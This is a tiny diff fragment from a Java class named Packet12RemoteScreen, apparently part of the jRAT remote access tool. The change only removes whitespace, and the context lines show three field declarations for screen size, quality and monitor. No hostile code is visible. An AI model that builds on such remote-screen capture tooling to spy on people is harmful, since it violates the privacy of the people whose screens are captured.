@@ -4,9 +4,8 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet12RemoteScreen extends AbstractOutgoingPacket {
-	
+
 	private double size;
 	private int quality;
 	private int monitor;
